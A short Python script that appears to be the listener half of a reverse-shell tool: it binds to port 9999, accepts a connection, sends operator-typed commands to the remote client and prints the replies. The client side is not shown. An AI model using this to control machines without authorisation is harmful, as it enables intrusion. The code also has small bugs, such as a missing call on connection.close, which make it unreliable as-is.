import socket
import sys

def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("socket creation error: " + str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()

def socket_accept():
    connection , address = s.accept()
    print("connection has been established | " + "IP" + address[0] + "| Port " + str(address[1]))
    send_commands(connection)
    connection.close

def send_commands(connection):
    while True:
        cmd = input()
        if cmd == 'quit':
            connection.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            connection.send(str.encode(cmd))
            client_response = str(connection.recv(1024), "utf-8")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()